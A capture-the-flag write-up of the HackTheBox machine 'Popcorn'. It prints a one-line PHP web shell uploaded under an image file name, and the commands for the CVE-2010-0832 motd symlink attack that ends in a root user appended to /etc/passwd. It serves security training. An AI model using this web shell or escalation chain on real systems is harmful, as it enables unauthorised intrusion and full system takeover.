
 
## Reconnaissance

### nmap 

![](./IMG/0.png)

###  Web Service 

![](./IMG/1.png)

### Gobuster 

![](./IMG/2.png)

### Web Service 2

> /test --> phpinfo

![](./IMG/3.png)
> /cgi-bin --> Forbidden 

![](./IMG/4.png)

> /torrent 

![](./IMG/5.png)

> Login page 

![](./IMG/6.png)
> Useful information 

```
Torrent Hoster
```

![](./IMG/7.png)

> Search exploit code by Torrent Hoster 

![](./IMG/8.png)

![](./IMG/9.png)

![](./IMG/10.png)

> Actually, it's hard to understand how to exploit from above decription.
> I start to enumerate torrent page 
> Following the exploit, I access /torrents.php

![](./IMG/11.png)

> It will redirect to /index.php?mode=directory

![](./IMG/12.png)

> I tried to access Upload function but the authorized user is necessary 
> It will redirect to /login if I don't have authorized user

![](./IMG/14.png)

> I tried to register an account then login and access to upload function again.

![](./IMG/15.png)

> I tried to upload a php web shell 

![](./IMG/16.png)
> It fails...

![](./IMG/17.png)

>  Then I tried to upload the torrent which exist in the server one(kali linux)


![](./IMG/18.png)


![](./IMG/19.png)
> Still failed ... 

![](./IMG/20.png)
## Exploit 

> After research and get some hint. 
> I move to kali official site and download another torrent file 

![](./IMG/21.png)
> Upload it.

![](./IMG/22.png)
> It success, and there is another function I can use in the result page

![](./IMG/23.png)

> Here is a screenshots column
> and I can click "Edit this torrent"

![](./IMG/24.png)

![](./IMG/25.png)
> Then another windows will pop up 
> It provides another upload function which accept image file (PNG, jpg, jpeg, gif)

![](./IMG/26.png)

>  I still tried to upload php file first

![](./IMG/27.png)
> Response : "Invalid file"

![](./IMG/28.png)
> Then I tried to upload an image file (jpg)

![](./IMG/29.png)

> The result display as follow

![](./IMG/30.png)
> Then I tried to upload another PNG file (since the file signature for PNG is easier than others)
> Then I modified the PNG content to the following 

```
<?php echo shell_exec($_GET['cmd']); ?>
```
> And modified the file name to test.png.php

![](./IMG/31.png)
> Success to upload 

![](./IMG/32.png)
> Then I tried to access the file location, it will look like follow

![](./IMG/33.png)
> Adding the parameter (cmd) and tried to execute command 
> RCE success.

```
?cmd=id
```

![](./IMG/34.png)

> Next, I tried to create reverse shell.
> I upload webshell and modify the request by following above setting.

![](./IMG/35.png)
> Then access this file.

![](./IMG/36.png)
> Check nc listener

![](./IMG/37.png)

> Check current user 

![](./IMG/38.png)

> Get user flag

![](./IMG/39.png)

## Privilege Escalation 

> Upload linpeas and execute to gathering information
> CVE information for PE

![](./IMG/40.png)

![](./IMG/41.png)

![](./IMG/42.png)

![](./IMG/43.png)

![](./IMG/44.png)
> Cron job settings

![](./IMG/45.png)
> /etc/passwd content

![](./IMG/46.png)

> Some interesting file --> debian.cnf

![](./IMG/47.png)
> SUID files

![](./IMG/48.png)

> SGID files

![](./IMG/49.png)

> So far, I got some information, and I target on using dirtycow to escalate.
> but it failed, and I didn't know the root cause.

![](./IMG/50.png)

> So, I start to check the discussion.
> And I know there is an interesting file in .cache directory

```
motd.loegal-displayed
```

![](./IMG/51.png)

> Research for it. 
> pam_motd (aka the MOTD module) in libpam-modules before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10 and libpam-modules before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS allows local users to change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory, related to "user file stamps" and the motd.legal-notice file.

- [(NVD)CVE-2010-0832](https://nvd.nist.gov/vuln/detail/CVE-2010-0832)
- [CVE-2010-0832](https://www.cvedetails.com/cve/CVE-2010-0832/)

> The following description: 

```
it allows local users to change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory, related to "user file stamps" and the motd.legal-notice file.
```

> So, I think the motd.legal-displayed in .cache, I can make arbitrary link to it and I also can get write permission to that file via this link.



> Confirm the os version 
> I think that is the target  ubuntu version 

```
lsb-release -a
```

![](./IMG/52.png)

> Search exploit code 

![](./IMG/58.png)

> I tried to use above 2 exploit scripts --> but both of them are failed
> I checked the shell script content, both of them are tried to create a new ssh directory and key.
> And tried to login with this new ssh key. By this way, the .cache directory with new MOTD file will be created
> Then create another new link(/etc/passwd) to this file.
> With this link, the current user(www-data) will get write permission to /etc/passwd
> So, I can create a new user with root permission.

![](./IMG/54.png)

![](./IMG/55.png)

> In here, I just think why I can't just modify the existing.
> Then I checked the existing one.
> The owner is george

![](./IMG/57.png)

![](./IMG/69.png)

> I think there are 2 reasons I can't finish the attack with this thinking 

1. I don't have ssh login credential for george
2. I can' create link for this file (permission denied)
![](./IMG/56.png)

> I also check the usage of MOTD 

- [How to Show MOTD in Linux](https://linuxhint.com/show-motd-in-linux/)

> MOTD is the abbreviation of “Message Of The Day”
> it is used to display a message when a remote user login to the Linux Operating system using SSH.

![](./IMG/53.png)

> So, I need to create a new ssh key and let me login by www-data.
> I move to /var/www and execute the following command 

```
ssh-keygen -q -t rsa -N '' -C 'pam'
```

![](./IMG/59.png)

![](./IMG/60.png)

```
cp .ssh/id_rsa.pub .ssh/authorized_keys
chmod 600 .ssh/authorized_keys 
```

![](./IMG/61.png)

> Download the private key file to my host 

![](./IMG/62.png)

> Change the permission 
```
chmod 600 /tmp/id_rsa
```
![](./IMG/63.png)

> Login by SSH but it failed 

![](./IMG/64.png)

> Research for this error.

- [解决SSH no matching host key type found 问题](https://blog.alanwei.com/blog/2022/01/24/ssh-no-matching-host-key-type-found/)

![](./IMG/66.png)
> Using following command, login success.

```
ssh -i /tmp/id_rsa www-data@10.129.230.173 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa
```

![](./IMG/65.png)

> Then get back to /var/www. 
> The .cache directory is created.

![](./IMG/67.png)
> The motd.legal-displayed also created

![](./IMG/68.png)

>  Follow the payload in exploit DB,

![](./IMG/70.png)

>  I deleted origin .cache directory
>  Then I created a link to /etc/passwd

```
rm -rf .cache
ln -s /etc/passwd .cache
```

![](./IMG/71.png)


![](./IMG/73.png)

![](./IMG/72.png)

> Move to ssh login panel
> With following step, create a new user

```
openssl passwd -1 mac 
```

> username and password are 'mac'

![](./IMG/74.png)

> Write into /etc/passwd

```
echo 'mac:$1$kbqHn0/w$nkw.eIajwNOmFl2h2fK3u/:0:0:pwned:/root/bin/bash' >> /etc/passwd
```

![](./IMG/75.png)

> Login with mac

```
su - mac
```

![](./IMG/76.png)

> Check privilege 

```
id
```

![](./IMG/77.png)

> Get root flag

![](./IMG/78.png)


## Reference 

### Writeup 

- [HTB: Popcorn](https://0xdf.gitlab.io/2020/06/23/htb-popcorn.html)
### Torrent Hoster
- [(Exploit DB)Torrent Hoster](https://www.exploit-db.com/exploits/11746)

### Privilege Escalation 

- [Update-Motd Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/)
- [(Exploit-DB)motd file tampering PE - 1](https://www.exploit-db.com/exploits/14273)
- [(Exploit-DB)motd file tampering PE - 2](https://www.exploit-db.com/exploits/14339)
- [How to Show MOTD in Linux](https://linuxhint.com/show-motd-in-linux/)
- [Linux motd详解](https://developer.aliyun.com/article/427180)
- [motd(5) ](https://man7.org/linux/man-pages/man5/motd.5.html)
- [MOTD – Privilege Escalation](https://vk9-sec.com/motd-privilege-escalation/)
- [(NVD)CVE-2010-0832](https://nvd.nist.gov/vuln/detail/CVE-2010-0832)
- [CVE-2010-0832](https://www.cvedetails.com/cve/CVE-2010-0832/)

#### DirtyCow

- [(GITHUB)dirtycow](https://github.com/firefart/dirtycow)
- [(EXPLOIT-DB)dirtycow](https://www.exploit-db.com/download/40611)

### SCP command 

- [How to Use SCP Command to Securely Transfer Files](https://linuxize.com/post/how-to-use-scp-command-to-securely-transfer-files/)

### SSH issue 

- [解决SSH no matching host key type found 问题](https://blog.alanwei.com/blog/2022/01/24/ssh-no-matching-host-key-type-found/)

###### tags: `HackTheBox`